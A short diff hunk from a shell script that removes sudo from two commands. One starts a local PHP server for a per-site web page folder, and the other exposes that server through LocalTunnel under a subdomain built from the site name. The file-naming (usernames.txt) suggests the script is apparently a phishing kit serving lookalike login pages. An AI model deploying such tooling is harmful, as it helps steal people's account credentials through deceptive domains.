@@ -347,11 +347,11 @@ rm -rf webpage/$site/usernames.txt
 fi
 
 printf "${Yellow}Starting ${BGreen}PHP ${Green}server\n"
-cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server" -e "/bin/sudo php -S 127.0.0.1:443" > /dev/null 2>&1 &
+cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server" -e "php -S 127.0.0.1:443" > /dev/null 2>&1 &
 sleep 5
 printf "${BGreen}OK.${clear}\n"
 printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
-xterm -hold -geometry 90x26+1000+1000 -T "LocalTunnel server" -e "/bin/sudo lt --port 443 --subdomain $site-com" > /dev/null 2>&1 &
+xterm -hold -geometry 90x26+1000+1000 -T "LocalTunnel server" -e "lt --port 443 --subdomain $site-com" > /dev/null 2>&1 &
 sleep 10
 printf "${BGreen}OK.${clear}\n\n"
 printf "${BYellow}Your Domain name is: ${BGreen}https://$site-com.loca.lt\n"
